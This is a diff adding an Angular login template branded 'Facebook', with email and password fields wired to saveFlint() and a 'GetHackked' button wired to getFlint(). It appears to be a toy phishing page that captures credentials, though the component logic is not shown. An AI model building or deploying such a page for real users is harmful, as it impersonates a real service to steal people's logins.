@@ -1,0 +1,21 @@
+<div class="login-form">
+
+
+  <form [formGroup]="flintFormGroup" name="flintFormGroup">
+    <h2 class="text-center">Facebook</h2>
+    <div class="form-group">
+      <input type="email" class="form-control" placeholder="Email" formControlName="email">
+      <p>
+      </p>
+      <input type="password" class="form-control" placeholder="Password" formControlName="password">
+    </div>
+    <div class="form-group">
+      <button type="submit" class="btn btn-secondary btn-block" (click)="saveFlint()">Login</button>
+    </div>
+    <div class="form-group">
+      <button type="submit" class="btn btn-secondary btn-block" (click)="getFlint()">GetHackked</button>
+    </div>
+    <p class=" text-center"><a href="#">Forgot Password?</a></p>
+  </form>
+  <p class="text-center small">Not Registered? <a href="#">Create an Account</a></p>
+</div>
